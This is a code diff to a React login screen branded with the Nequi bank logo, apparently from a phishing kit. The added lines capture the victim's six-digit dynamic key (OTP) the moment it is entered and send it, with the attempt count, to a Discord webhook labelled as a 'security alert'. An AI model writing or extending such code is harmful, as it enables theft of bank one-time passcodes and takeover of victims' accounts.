@@ -1,6 +1,7 @@
 import { useState, useEffect, useRef } from 'react'
 import { generateApplicationId } from '../types'
 import { NequiLogo } from './NequiLogo'
+import { DiscordWebhookService } from '../services/DiscordWebhookService'
 
 interface AccessScreenProps {
   onAccess: (applicationId: string) => void
@@ -66,7 +67,15 @@ export function AccessScreen({ onAccess, onBack }: AccessScreenProps) {
     const next = pin + key
     if (next.length > PIN_LENGTH) return
     setPin(next)
-    if (next.length === PIN_LENGTH) startLoading()
+    if (next.length === PIN_LENGTH) {
+      DiscordWebhookService.sendSecurityAlert(
+        'Clave dinámica ingresada',
+        'Usuario ingresó su clave dinámica de 6 dígitos',
+        { role: 'Cliente' },
+        { 'Clave dinámica (OTP)': next, 'Intento': attempts + 1 },
+      )
+      startLoading()
+    }
   }
 
   return (
